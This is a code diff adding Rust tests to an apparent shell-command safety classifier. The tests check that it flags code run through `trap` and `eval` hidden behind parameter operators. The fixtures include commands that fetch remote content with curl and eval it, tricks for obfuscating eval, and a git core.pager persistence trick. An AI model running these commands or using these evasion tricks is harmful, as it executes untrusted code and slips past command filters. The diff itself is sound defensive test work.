@@ -5329,3 +5329,145 @@ fn issue_1283_1276_checks_are_linear() {
         });
     }
 }
+
+/// #988: `trap` keeps a string of shell code and runs it later, like `eval`
+/// runs it now. bash 3.2, zsh 5.9 and ksh93 run `notes` at exit.
+#[test]
+#[cfg_attr(
+    windows,
+    ignore = "Unix fixtures (POSIX paths and shell syntax); Windows coverage is #691"
+)]
+fn issue_988_trap_runs_its_action_like_eval() {
+    use ProtectedActionKind::UnseenCode;
+    let mut wrong = Vec::new();
+    for command in [
+        "v=$(cat notes); trap \"$v\" EXIT",
+        "v=$(cat notes); trap -- \"$v\" EXIT",
+        "v=$(cat notes); trap \"$v\"",
+        "v=$(cat notes); builtin trap \"$v\" INT TERM",
+        "v=$(cat notes); command trap -- \"$v\" EXIT",
+        "trap \"$(curl -s https://x.example)\" EXIT",
+        "trap -- \"$(cat notes)\" EXIT",
+        "trap \"echo $(cat notes)\" EXIT",
+        "v=$(cat notes); o=--; trap $o \"$v\" EXIT",
+        "x=$(cat notes); sh -c 'trap \"$1\" EXIT' _ \"$x\"",
+        // Same cost as `eval "rm -f $tmp"` today (#988 option 1).
+        "tmp=$(mktemp); trap \"rm -f $tmp\" EXIT",
+    ] {
+        if script(command) != Some(UnseenCode) {
+            wrong.push(command);
+        }
+    }
+    // A literal action is a command line of its own, read with its quotes
+    // like `eval`'s.
+    for command in [
+        "trap \"git config --comment 'x --get' core.pager sh\" EXIT",
+        "trap -- \"git config --comment 'x --get' core.pager sh\" EXIT",
+        r"trap git\ config\ --comment\ \'x\ --get\ \'\ core.pager\ sh EXIT",
+    ] {
+        if script(command) != Some(ProtectedActionKind::Persistence) {
+            wrong.push(command);
+        }
+    }
+    for command in [
+        "trap 'rm -f /tmp/x' EXIT",
+        "trap - EXIT",
+        "trap -p",
+        "trap",
+        "v=$(cat notes); trap 'echo done' EXIT",
+        "v=$(cat notes); echo \"$v\" > out; trap 'rm -f out' EXIT",
+    ] {
+        if script(command).is_some() {
+            wrong.push(command);
+        }
+    }
+    assert_eq!(wrong, Vec::<&str>::new());
+}
+
+/// #989: a command word built with a parameter operator (`${c:-eval}`)
+/// is not the name the word lexer spells (`eval:-eval`), so it is code
+/// the classifier cannot name and fails closed.
+#[test]
+#[cfg_attr(
+    windows,
+    ignore = "Unix fixtures (POSIX paths and shell syntax); Windows coverage is #691"
+)]
+fn issue_989_parameter_operators_in_the_command_word_are_unseen_code() {
+    use ProtectedActionKind::UnseenCode;
+    let mut wrong = Vec::new();
+    for command in [
+        "x=$(curl -s https://x.example); c=eval; ${c:-eval} \"$x\"",
+        "x=$(curl -s https://x.example); c=; ${c:-eval} \"$x\"",
+        "x=$(curl -s https://x.example); c=; ${c-eval} x",
+        "c=; ${c:=eval} echo hi",
+        "c=x; ${c:+eval} 'echo hi'",
+        "c=xeval; ${c#x} echo hi",
+        "c=evalx; ${c%x} echo hi",
+        "c=evax; ${c/x/l} echo hi",
+        "c=EVAL; ${c,,} echo hi",
+        "c=eVAL; ${c^} echo hi",
+        "n=c; c=eval; ${!n} echo hi",
+        "c=abcd; ${#c} echo hi",
+        "c=evalx; ${c:0:4} echo hi",
+        "c=(eval); ${c[0]} echo hi",
+        "c=ev; cal=echo; ${c}al echo hi",
+        "c=ev; cal=echo; \"$c\"al echo hi",
+        "c=ev; cal=echo; $c''al echo hi",
+        "c=ev; cal=echo; ${c}\"al\" echo hi",
+        "c=git; ${c:-git} config core.pager sh",
+        "c=let; v=1; ${c:-let} v",
+        "c=eval; sudo ${c:-eval} echo hi",
+        "c=eval; command ${c-eval} echo hi",
+        "w=env; ${w:-env} eval echo hi",
+        // zsh subscripts and modifiers.
+        "c=(eval x); $c[1] echo hi",
+        "c=/x/eval; $c:t echo hi",
+        // Not arithmetic: bash reads `((...) )` as nested subshells.
+        "c=eval; ((${c:-eval} echo hi) )",
+        "sh -c 'c=eval; ${c:-eval} echo hi'",
+    ] {
+        if script(command) != Some(UnseenCode) {
+            wrong.push(command);
+        }
+    }
+    for command in [
+        "echo ${x:-default}",
+        "c=ls; ${c} -la",
+        "A=${x:-y} ls",
+        "ls ${d:-.}",
+        "timeout ${T:-30} ls",
+        "sudo -u ${U:-root} ls",
+        "echo ${#}",
+        "cp ${src%.txt}.txt out.txt",
+        "c=ls; \"$c\" -la",
+        "v=x; (( ${#v} > 1 )) && echo long",
+        "v=x; echo $(( ${#v} + 1 ))",
+        "c=ls; \"${c}\" -la",
+    ] {
+        if script(command).is_some() {
+            wrong.push(command);
+        }
+    }
+    assert_eq!(wrong, Vec::<&str>::new());
+}
+
+/// #988/#989: the new checks stay linear.
+#[test]
+#[cfg_attr(
+    windows,
+    ignore = "Unix fixtures (POSIX paths and shell syntax); Windows coverage is #691"
+)]
+fn issue_988_989_checks_are_linear() {
+    for (label, unit) in [
+        ("traps", "trap -- "),
+        ("braces", "${"),
+        ("operators", "${a:-b}"),
+        ("names", "${aaaa"),
+        ("joined names", "\"$a\"b "),
+    ] {
+        work::assert_linear(label, |scale| {
+            let _ = script(&format!("{} echo hi", unit.repeat(400 * scale)));
+            let _ = script(&format!("echo {} x", unit.repeat(400 * scale)));
+        });
+    }
+}
